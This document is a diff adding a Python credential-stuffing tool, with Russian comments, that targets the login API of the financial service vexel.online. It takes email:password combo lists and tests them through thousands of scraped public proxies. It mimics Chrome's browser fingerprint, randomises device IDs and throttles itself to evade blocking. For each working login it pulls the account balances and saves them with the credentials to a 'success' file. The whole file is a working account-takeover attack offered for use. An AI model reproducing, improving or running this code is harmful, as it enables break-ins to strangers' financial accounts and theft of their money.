@@ -1,0 +1,253 @@
+import json, random, string, time, hashlib, uuid, re, os, sys, threading
+from concurrent.futures import ThreadPoolExecutor
+from curl_cffi import requests
+
+# --- ЦВЕТА ---
+class Color:
+    GREEN = '\033[92m'; RED = '\033[91m'; YELLOW = '\033[93m'
+    CYAN = '\033[96m'; MAGENTA = '\033[95m'; WHITE = '\033[97m'; RESET = '\033[0m'
+
+# --- КОНФИГУРАЦИЯ (МОЖНО ПРАВИТЬ САМОМУ) ---
+STAGGER_RANGE = (0.2, 0.3)      # Рандом задержки между потоками (от, до)
+POST_CHECK_RANGE = (4.0, 5.0)   # Рандом паузы после аккаунта (от, до)
+COOLDOWN_TIME = 600             # Время отдыха прокси в секундах (10 мин)
+BAD_CONFIRMATIONS_NEEDED = 2    # Подтверждения для БЭДа
+BANNED_CONFIRMATIONS_NEEDED = 1 # Подтверждения для БАНА (обычно 1 достаточно)
+
+# --- ГЛОБАЛЬНЫЕ ОБЪЕКТЫ ---
+print_lock = threading.Lock()
+save_lock = threading.Lock()
+proxy_lock = threading.Lock()
+stats_lock = threading.Lock()
+pause_event = threading.Event() 
+pause_event.set() 
+
+stats = {'good': 0, 'bad': 0, 'banned': 0, 'left': 0, 'proxies_count': 0, 'fail_streak': 0}
+all_proxies = [] 
+banned_proxies = {} # {proxy_url: timestamp}
+
+def log(msg, color=Color.WHITE):
+    if not pause_event.is_set() and "[GOOD]" not in msg and "[BAD]" not in msg and "[BANNED]" not in msg: return
+    with print_lock:
+        sys.stdout.write(f"\r{color}{msg}{Color.RESET}\n")
+        sys.stdout.flush()
+
+# --- СИСТЕМА ОБНОВЛЕНИЯ ПРОКСИ ---
+
+def proxy_refresher():
+    global all_proxies
+    proxy_re = re.compile(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}')
+    sources = [
+        ("socks5", "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all"),
+        ("socks5", "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt"),
+        ("socks5", "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt"),
+        ("socks5", "https://spys.me/socks.txt"),
+        ("socks4", "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all"),
+        ("http", "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"),
+        ("http", "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt")
+    ]
+    import requests as r_simple
+    while True:
+        new_proxies_set = set()
+        for proto, url in sources:
+            try:
+                resp = r_simple.get(url, timeout=15)
+                if resp.status_code == 200:
+                    found = proxy_re.findall(resp.text)
+                    for p in found: new_proxies_set.add(f"{proto}://{p}")
+            except: continue
+        if new_proxies_set:
+            with proxy_lock:
+                all_proxies = list(new_proxies_set)
+                stats['proxies_count'] = len(all_proxies)
+            log(f"[SYSTEM] База обновлена: {len(all_proxies)} прокси.", Color.CYAN)
+        time.sleep(120)
+
+# --- СИСТЕМА АВТОСОХРАНЕНИЯ ---
+
+def get_history_path(base_file_path):
+    return f".vexel_history_{os.path.basename(base_file_path)}.txt"
+
+def load_history(history_path):
+    if os.path.exists(history_path):
+        with open(history_path, 'r', encoding='utf-8') as f:
+            return set(line.strip() for line in f)
+    return set()
+
+def add_to_history(history_path, account_line):
+    with save_lock:
+        with open(history_path, 'a', encoding='utf-8') as f:
+            f.write(account_line + "\n")
+
+# --- КЛАСС ЧЕКЕРА ---
+
+class VexelChecker:
+    def __init__(self, email, password, p_threads, history_path, full_line):
+        self.email = email
+        self.password = password
+        self.p_threads = p_threads
+        self.history_path = history_path
+        self.full_line = full_line
+        self.found = False
+        self.lock = threading.Lock()
+        self.bad_confirmations = 0
+        self.banned_confirmations = 0
+        
+        # Chrome 124 + Точный Device ID (md5 хвост)
+        self.ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
+        random_hex = hashlib.md5(os.urandom(16)).hexdigest()
+        self.device_id = f"20fa64202c14628beaf7778c1c562a7b-{random_hex}"
+
+    def check_proxy(self, proxy_str):
+        if self.found or not pause_event.is_set(): return
+        
+        # Проверка Cooldown
+        if proxy_str in banned_proxies:
+            if time.time() - banned_proxies[proxy_str] < COOLDOWN_TIME: return
+
+        try:
+            session = requests.Session(impersonate="chrome124")
+            session.proxies = {"http": proxy_str, "https": proxy_str}
+            
+            headers = {
+                "Host": "vexel.online", "accept": "application/json", "accept-language": "ru-RU,ru;q=0.9",
+                "content-type": "application/json;charset=UTF-8", "origin": "https://app.vexel.com",
+                "referer": "https://app.vexel.com/", "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
+                "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"', "user-agent": self.ua,
+                "x-device-id": self.device_id, "x-device-model": self.ua, "x-device-platform": "Web"
+            }
+            
+            payload = {"email": self.email, "password": self.password, "lang": "ru"}
+            resp = session.post("https://vexel.online/api/v2/auth/newlogin", 
+                                data=json.dumps(payload, separators=(',', ':')), 
+                                headers=headers, timeout=12)
+            
+            if resp.status_code == 200:
+                # GOOD
+                if '"access_token":"' in resp.text:
+                    with self.lock:
+                        if self.found: return
+                        self.found = True
+                    token = resp.json()['data']['access_token']
+                    headers["Authorization"] = f"Bearer {token}"
+                    acc_res = session.post("https://vexel.online/api/v2/accounts", 
+                                           data=json.dumps({"operation": "accountGetList"}, separators=(',', ':')), 
+                                           headers=headers, timeout=10)
+                    balances = " | ".join(re.findall(r'"name"(.*?),"overdraft"', acc_res.text)).replace('":"', ':').replace('"', '').strip(': ')
+                    log(f"[GOOD] {self.email}:{self.password} | {balances}", Color.GREEN)
+                    with save_lock:
+                        with open("success.txt", "a", encoding="utf-8") as f: f.write(f"{self.email}:{self.password} | {balances}\n")
+                    add_to_history(self.history_path, self.full_line)
+                    with stats_lock: stats['good'] += 1; stats['fail_streak'] = 0 
+
+                # BANNED / BAD
+                elif '"status":0' in resp.text:
+                    data = resp.json()
+                    err_code = data.get('error', {}).get('code')
+                    
+                    if err_code == 424: # BANNED
+                        with self.lock:
+                            self.banned_confirmations += 1
+                            if self.banned_confirmations >= BANNED_CONFIRMATIONS_NEEDED and not self.found:
+                                self.found = True
+                                log(f"[BANNED] {self.email}:{self.password}", Color.MAGENTA)
+                                with save_lock:
+                                    with open("banned.txt", "a", encoding="utf-8") as f: f.write(f"{self.email}:{self.password}\n")
+                                add_to_history(self.history_path, self.full_line)
+                                with stats_lock: stats['banned'] += 1; stats['fail_streak'] = 0
+
+                    elif err_code == 401: # BAD
+                        with self.lock:
+                            self.bad_confirmations += 1
+                            if self.bad_confirmations >= BAD_CONFIRMATIONS_NEEDED and not self.found:
+                                self.found = True
+                                log(f"[BAD] {self.email}:{self.password}", Color.RED)
+                                with save_lock:
+                                    with open("bad.txt", "a", encoding="utf-8") as f: f.write(f"{self.email}:{self.password}\n")
+                                add_to_history(self.history_path, self.full_line)
+                                with stats_lock: stats['bad'] += 1; stats['fail_streak'] = 0
+            
+            elif resp.status_code == 403:
+                banned_proxies[proxy_str] = time.time()
+
+        except: 
+            banned_proxies[proxy_str] = time.time() # FAIL тоже в отстойник
+
+    def run(self):
+        pause_event.wait() 
+        with proxy_lock:
+            current_proxies = random.sample(all_proxies, min(len(all_proxies), 1000))
+        
+        with ThreadPoolExecutor(max_workers=self.p_threads) as executor:
+            for p in current_proxies:
+                if self.found: break
+                executor.submit(self.check_proxy, p)
+                # ИСПОЛЬЗУЕМ РАНДОМНЫЙ STAGGER
+                time.sleep(random.uniform(*STAGGER_RANGE))
+
+        if not self.found:
+            with stats_lock:
+                stats['fail_streak'] += 1
+                current_streak = stats['fail_streak']
+            log(f"[FAIL {current_streak}/10] {self.email}", Color.YELLOW)
+            with save_lock:
+                with open("failed_to_check.txt", "a", encoding="utf-8") as f:
+                    f.write(f"{self.email}:{self.password}\n")
+            add_to_history(self.history_path, self.full_line)
+            if current_streak >= 10: self.trigger_auto_pause()
+        
+        # ИСПОЛЬЗУЕМ РАНДОМНУЮ ПАУЗУ ПОСЛЕ АККАУНТА
+        time.sleep(random.uniform(*POST_CHECK_RANGE))
+        with stats_lock: stats['left'] -= 1
+
+    def trigger_auto_pause(self):
+        if not pause_event.is_set(): return
+        pause_event.clear()
+        def countdown():
+            for i in range(2400, 0, -1):
+                mins, secs = divmod(i, 60)
+                sys.stdout.write(f"\r{Color.YELLOW}[!!!] ПАУЗА (10 FAIL). Ждем обновления IP: {mins:02d}:{secs:02d} {Color.RESET}")
+                sys.stdout.flush()
+                time.sleep(1)
+            with stats_lock: stats['fail_streak'] = 0
+            pause_event.set()
+            log("\n[>>>] Работа возобновлена!", Color.CYAN)
+        threading.Thread(target=countdown, daemon=True).start()
+
+# --- MAIN ---
+
+def main():
+    global all_proxies
+    os.system('cls' if os.name == 'nt' else 'clear')
+    log("=== VEXEL ENTERPRISE TURBO (ULTRA RELIABLE) ===", Color.CYAN)
+    path = input("\nПеретяните файл с аккаунтами: ").strip().replace('"', '').replace("'", "")
+    if not os.path.exists(path): return
+    history_file = get_history_path(path)
+    history_data = load_history(history_file)
+    with open(path, "r", encoding="utf-8") as f:
+        all_accounts = [l.strip() for l in f if ":" in l]
+    if history_data:
+        log(f"\n[!] Найдена история: {len(history_data)} аккаунтов.", Color.YELLOW)
+        if input("Продолжить (y/n)? ").lower() == 'y':
+            all_accounts = [acc for acc in all_accounts if acc not in history_data]
+        else:
+            if os.path.exists(history_file): os.remove(history_file)
+    if not all_accounts: return
+    threading.Thread(target=proxy_refresher, daemon=True).start()
+    while not all_proxies: time.sleep(1)
+    try:
+        max_accs = int(input("Параллельных аккаунтов (30): "))
+        threads_per_acc = int(input("Прокси на 1 аккаунт (50): "))
+    except: max_accs, threads_per_acc = 30, 50
+    stats['left'] = len(all_accounts)
+    with ThreadPoolExecutor(max_workers=max_accs) as acc_executor:
+        for acc_line in all_accounts:
+            u, p = acc_line.split(":", 1)
+            checker = VexelChecker(u, p, threads_per_acc, history_file, acc_line)
+            acc_executor.submit(checker.run)
+    log("\n--- ГОТОВО ---", Color.CYAN)
+    if stats['left'] == 0 and os.path.exists(history_file): os.remove(history_file)
+    input("Enter...")
+
+if __name__ == "__main__":
+    main()
